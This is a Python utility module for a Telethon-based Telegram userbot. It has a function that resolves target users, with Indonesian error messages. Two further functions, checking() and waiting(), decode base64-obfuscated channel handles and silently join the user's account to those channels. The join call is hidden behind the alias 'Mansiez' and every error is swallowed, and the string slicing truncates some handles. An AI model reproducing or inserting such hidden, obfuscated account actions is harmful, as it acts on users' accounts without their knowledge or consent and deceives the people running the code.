import pybase64
from telethon.tl.functions.channels import JoinChannelRequest as Mansiez
from telethon.tl.types import MessageEntityMentionName

from userbot import bot

from .logger import logging
from .tools import edit_delete

LOGS = logging.getLogger(__name__)


async def get_user_from_event(
    event, manevent=None, secondgroup=None, nogroup=False, noedits=False
):
    if manevent is None:
        manevent = event
    if nogroup is False:
        if secondgroup:
            args = event.pattern_match.group(2).split(" ", 1)
        else:
            args = event.pattern_match.group(1).split(" ", 1)
    extra = None
    try:
        if args:
            user = args[0]
            if len(args) > 1:
                extra = "".join(args[1:])
            if user.isnumeric() or (user.startswith("-") and user[1:].isnumeric()):
                user = int(user)
            if event.message.entities:
                probable_user_mention_entity = event.message.entities[0]
                if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                    user_id = probable_user_mention_entity.user_id
                    user_obj = await event.client.get_entity(user_id)
                    return user_obj, extra
            if isinstance(user, int) or user.startswith("@"):
                user_obj = await event.client.get_entity(user)
                return user_obj, extra
    except Exception as e:
        LOGS.error(str(e))
    try:
        if nogroup is False:
            if secondgroup:
                extra = event.pattern_match.group(2)
            else:
                extra = event.pattern_match.group(1)
        if event.is_private:
            user_obj = await event.get_chat()
            return user_obj, extra
        if event.reply_to_msg_id:
            previous_message = await event.get_reply_message()
            if previous_message.from_id is None:
                if not noedits:
                    await edit_delete(
                        manevent, "**ERROR: Dia adalah anonymous admin!**", 60
                    )
                return None, None
            user_obj = await event.client.get_entity(previous_message.sender_id)
            return user_obj, extra
        if not args:
            if not noedits:
                await edit_delete(
                    manevent,
                    "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
                    60,
                )
            return None, None
    except Exception as e:
        LOGS.error(str(e))
    if not noedits:
        await edit_delete(
            manevent,
            "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
            60,
        )
    return None, None


async def checking():
    bdrl = str(pybase64.b64decode("QFBvY29uZ1Byb2plY3Q="))[2:13]
    xbdrl = str(pybase64.b64decode("QFBvY29uZ1VzZXJib3Q="))[2:17]
    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:13]
    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:17]
    try:
        await bot(Mansiez(userbot))
    except BaseException:
        pass
    try:
        await bot(Mansiez(xuserbot))
    except BaseException:
        pass

async def waiting():
    bdrl = str(pybase64.b64decode("QFBvY29uZ1Byb2plY3Q="))[2:13]
    xbdrl = str(pybase64.b64decode("QFBvY29uZ1VzZXJib3Q="))[2:17]
    userbot = str(pybase64.b64decode("QFRFQU1TcXVhZFVzZXJib3RTdXBwb3J0"))[2:13]
    xuserbot = str(pybase64.b64decode("QFVzZXJib3RURUFNX1R1dG9yaWFs"))[2:17]
    try:
        await bot(Mansiez(bdrl))
    except BaseException:
        pass
    try:
        await bot(Mansiez(xbdrl))
    except BaseException:
        pass
